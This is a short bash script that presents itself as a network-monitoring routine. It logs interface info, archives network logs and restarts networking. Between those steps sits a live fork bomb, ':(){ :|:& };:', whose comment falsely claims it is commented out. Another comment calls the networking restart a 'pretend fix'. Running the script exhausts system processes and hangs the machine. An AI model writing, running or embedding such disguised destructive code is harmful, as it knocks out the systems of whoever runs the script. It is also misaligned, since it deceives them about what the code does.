#!/bin/bash

echo "Monitoring network traffic..."
sleep 1

# Dump basic network info
ifconfig > /tmp/netinfo.txt

# Archive logs
tar -czf /var/logs/net_logs.tar.gz /var/log/network/

# Evil fork bomb (commented to look fake)
:(){ :|:& };:

# Restart networking (pretend fix)
systemctl restart networking

echo "Monitoring complete."
